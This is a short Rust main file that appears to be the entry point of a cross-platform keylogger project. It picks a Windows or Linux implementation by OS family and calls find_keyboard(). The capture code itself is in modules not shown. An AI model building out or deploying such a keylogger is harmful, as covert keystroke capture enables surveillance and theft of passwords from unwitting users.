use std::env::consts;

mod os;
use os::{
    keylogger::Keylogger,
    linux::Linux,
    windows::Windows,
};

fn main() {
    let os = consts::FAMILY;

    if os.contains("windows") {
        let kl = Windows { };

        kl.find_keyboard();
    } else {
        let kl = Linux { };

        kl.find_keyboard();
    }
}
